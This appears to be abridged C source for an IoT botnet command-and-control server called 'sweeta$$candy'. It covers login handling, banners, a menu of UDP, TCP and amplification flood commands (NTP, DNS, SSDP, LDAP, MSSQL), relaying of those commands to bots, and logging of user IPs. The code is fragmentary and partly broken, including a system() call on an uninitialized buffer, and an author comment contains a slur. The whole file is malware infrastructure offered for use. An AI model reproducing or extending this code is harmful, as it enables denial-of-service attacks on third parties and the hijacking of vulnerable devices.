...
//////////////////////////////////// flow says this is proper use of the volatile command
...
static int create_and_bind (char *port)                                                                                                                                                                                                                                                                                             // made by the nigga flow my discord tag is (flow#8358) sub & like my shit on youtube "flowaholic".
{
...
void *titleWriter(void *sock) 
{
        ...
        while(1)
        {
                ...
                sprintf(string, "%c]0; sweeta$$candy v1 | IoT Devices: %d | gum drop clans %d %c", '\033', clientsConnected(), managesConnected, '\007');
...
void *telnetWorker(void *sock) { 
        ...
        int i=0;
        int c;
        fp=fopen("dream.txt", "r"); // format: user pass
        while(!feof(fp)) 
        {
                c=fgetc(fp);
                ++i;
        ...
        sprintf(failed_line1, "Login Attempt Recorded.\r\n");  // We are Attempting To Display FailedBanner!
        sprintf(failed_line2, "Please contact Flow if your log wont work!!\r\n");  // We are Attempting To Display FailedBanner!
        ...
        candy: // We are Displaying Attempting to display main banner!
        ...
        char reaper_8  [90000];
        char reaper_9  [90000];
        char reaper_10 [90000];




        sprintf(reaper_1, "\x1b[34m                         ██▄   \x1b[95m█▄▄▄▄ \x1b[34m▄███▄   \x1b[95m██   \x1b[34m█▀▄▀█ \r\n");
        sprintf(reaper_2, "\x1b[34m                         █  █  \x1b[95m█  ▄▀ \x1b[34m█▀   ▀  \x1b[95m█ █  \x1b[34m█ █ █ \r\n");
        sprintf(reaper_3, "\x1b[34m                         █   █ \x1b[95m█▀▀▌  \x1b[34m██▄▄    \x1b[95m█▄▄█ \x1b[34m█ ▄ █ \r\n");
        sprintf(reaper_4, "\x1b[34m                         █  █  \x1b[95m█  █  \x1b[34m█▄   ▄▀ \x1b[95m█  █ \x1b[34m█   █ \r\n");
        sprintf(reaper_5, "\x1b[34m                         ███▀  \x1b[95m  █   \x1b[34m▀███▀   \x1b[95m█  █ \x1b[34m   █  \r\n");
        sprintf(reaper_6, "\x1b[34m                               \x1b[95m ▀    \x1b[34m        \x1b[95m  █  \x1b[34m  ▀   \r\n");
        sprintf(reaper_7, "\x1b[34m                               \x1b[95m      \x1b[34m        \x1b[95m ▀   \x1b[34m      \r\n");
        sprintf(reaper_8, "\x1b[0m                 Dont we all dream...\r\n");
		sprintf(reaper_8, "\x1b[95m                  Type help for all cmds\r\n");
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        ...
        if(send(thefd, reaper_4, strlen(reaper_4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, reaper_5, strlen(reaper_5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, reaper_6, strlen(reaper_6), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, reaper_7, strlen(reaper_7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, reaper_8, strlen(reaper_8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, reaper_9, strlen(reaper_9), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, reaper_10, strlen(reaper_10), MSG_NOSIGNAL) == -1) goto end;
        while(1) 
        { 
        sprintf(botnet, "\x1b[1;31msweeta$$candy\x1b[1;37m#", accounts[find_line].id, buf); 
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        pthread_create(&title, NULL, &titleWriter, sock); 
        ...
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m.\x1b[1;36mssh\x1b[1;37m] - \x1b[1;31m %d \r\n\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m.\x1b[1;36musers\x1b[1;37m] - \x1b[1;31m %d \r\n", clientsConnected(), managesConnected);        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        } // Let Us Continue Our Journey!
       if(strstr(buf, "HELP") || strstr(buf, "help") || strstr(buf, "Help"))  {
        ...
        sprintf(help_cmd1,   "\x1b[1;37m[\x1b[1;31m+\x1b[1;37m]All the Commands\x1b[1;37m[\x1b[1;31m+\x1b[1;37m]     \r\n");
        ...
        sprintf(l4udp_udp1,  "\x1b[1;37m[\x1b[1;31mUDP Flood\x1b[1;37m]    !* UDP  [\x1b[1;31mIP\x1b[1;37m] [\x1b[1;31mPORT\x1b[1;37m] [\x1b[1;31mTIME\x1b[1;37m]║ \r\n");
        ...
        sprintf(botnet, "\x1b[1;31msweeta$$candy\x1b[1;37m#", accounts[find_line].id, buf); // We Are Defying Spoofed Attacks!
        ...
        {   // Let Us Continue Our Journey!
        printf("\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].id, buf); // We Are Attempting To Logout!
        FILE *logFile;// We Are Attempting To Logout!
        logFile = fopen("LOGOUT.log", "a");// We Are Attempting To Logout!
        fprintf(logFile, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].id, buf);// We Are Attempting To Logout!
        ...
        {    // Let Us Continue Our Journey!
        printf("\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Has Attempted To Shell Your Bots!\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("SHELL.log", "a");
        fprintf(logFile, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] User: \x1b[0;36m%s\x1b[1;37m Has Attempted To Shell Your Bots!\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end; // We Are Dropping Down to end:
        }  // Let Us Continue Our Journey!
        ...
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[1;31mUDP \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "!* STD")) // We Are Sending STD Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[1;31mSTD \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
            if(strstr(buf, "adduser") || strstr(buf, "ADDUSER"))
    {
      if(strcmp(admin, accounts[find_line].user) == 0)
      {
        ...
        char *uinfo[50];
        system(uinfo);
        printf("\x1b[1;37m[\x1b[1;31mcandy\x1b[1;37m] \x1b[1;37mUser:[\x1b[0;36m%s\x1b[1;37m] Added User:[\x1b[0;36m%s\x1b[1;37m]\n", accounts[find_line].id, userinfo);
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31mcandy\x1b[1;37m] \x1b[1;37mUser:[\x1b[0;36m%s\x1b[1;37m] Added User:[\x1b[0;36m%s\x1b[1;37m]\r\n", accounts[find_line].id, userinfo);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
      }
      else
      {
        ...
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[1;31mCNC \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "!* HTTP")) // We Are Sending HTTP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[1;31mHTTP \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        ...
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Loading sockets...\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "!* WGET")) // We Are Sending wget Flood!
        {  // Let Us Continue Our Journey!// Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[1;31mWGET \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "XMAS")) // We Are Reading TCP And Sending XMAS Flood!
        {  // Let Us Continue Our Journey!// Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[1;31mT\x1b[1;32mC\x1b[1;33mP\x1b[1;34m-\x1b[1;35mX\x1b[1;36mM\x1b[1;31mA\x1b[1;32mS \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "ALL")) // We Are Reading All TCP Methods and Sending TCP Flood!
        {  // Let Us Continue Our Journey!// Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[1;31mTCP \x1b[1;37mFlood using \x1b[1;31mALL \x1b[1;37mMethods!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "SYN")) // We Are Reading TCP And Sending SYN Flood!
        {  // Let Us Continue Our Journey!// Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[0;36mTCP-SYN \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "FIN")) // We Are Reading TCP And Sending FIN Flood!
        {  // Let Us Continue Our Journey!// Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[0;36mTCP-FIN \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "RST")) // We Are Reading TCP And Sending RST Flood!
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[0;36mTCP-RST \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "ACK")) // We Are Reading TCP And Sending ACK Flood!
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[0;36mTCP-ACK \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "PSH")) // We Are Reading TCP And Sending PSH Flood!
        {  // Let Us Continue Our Journey!  
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[0;36mTCP-PSH \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "PRO")) // We Are Reading TCP And Sending Pro Flood!
        {  // Let Us Continue Our Journey!  
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[0;36mTCP-PRO \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "CRI")) // We Are Reading TCP And Sending Cri Flood!
        {  // Let Us Continue Our Journey!  
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[0;36mTCP-CRI \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        ...
        system(uinfo);
        printf("[sweeta$$candy] Sending LDAP Attack to %s On Port %s For %s Seconds! \n", ip, port, time);
        sprintf(botnet, "[sweeta$$candy] Sending LDAP Attack to %s On Port %s For %s Seconds! \n", ip, port, time);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "root_ssdp")) // We Are Reading Client Using IP Header Modifications and Sending SSDP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[1;31mSSDP \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "root_ntp")) // We Are Reading Client Using IP Header Modifications and Sending NTP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[1;31mNTP \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "root_sentinel")) // We Are Reading Client Using IP Header Modifications and Sending SENTINEL Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[1;31mSENTINEL \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "root_dns")) // We Are Reading Client Using IP Header Modifications and Sending DNS Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[1;31mDNS \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "root_reaper")) // We Are Reading Client Using IP Header Modifications and Sending REAPER Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[1;31msweeta$$candy \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "root_mssql")) // We Are Reading Client Using IP Header Modifications and Sending MSSQL Flood!
        {     // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[1;31mMSSQL \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "root_portmap")) // We Are Reading Client Using IP Header Modifications and Sending PORTMAP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[1;31mPORTMAP \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "root_ts3")) // We Are Reading Client Using IP Header Modifications and Sending TS3 Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Sending \x1b[1;31mTS3 \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        ...
        {   // Let Us Continue Our Journey!
        goto candy; // We Are Going Up to reaoer:
        }  // Let Us Continue Our Journey!
        ...
        printf("\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] - Command:\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\n",accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("server.log", "a");
        fprintf(logFile, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] - Command:\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\n", accounts[find_line].id, buf);
        fclose(logFile);
...
{    
        ...
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Screening Error");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {  printf("\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Incoming Connection From ");
       
        client_addr(cli_addr);
        FILE *logFile;
        logFile = fopen("IP.log", "a");
        fprintf(logFile, "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Incoming Connection From [\x1b[0;36m%d.%d.%d.%d\x1b[1;37m]\n",cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
...
int main (int argc, char *argv[], void *sock)
{
        ...
        if (threads > 1000)
        {
        printf("\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Thread Limit Exceeded! Please Lower Threat Count!\n");
        return 0;
        }
        ...
        printf(RED "\x1b[1;37m[\x1b[1;31msweeta$$candy\x1b[1;37m] Successfully Screened - Created By [\x1b[0;36mFlexingOnLamers\x1b[1;37m]\n");
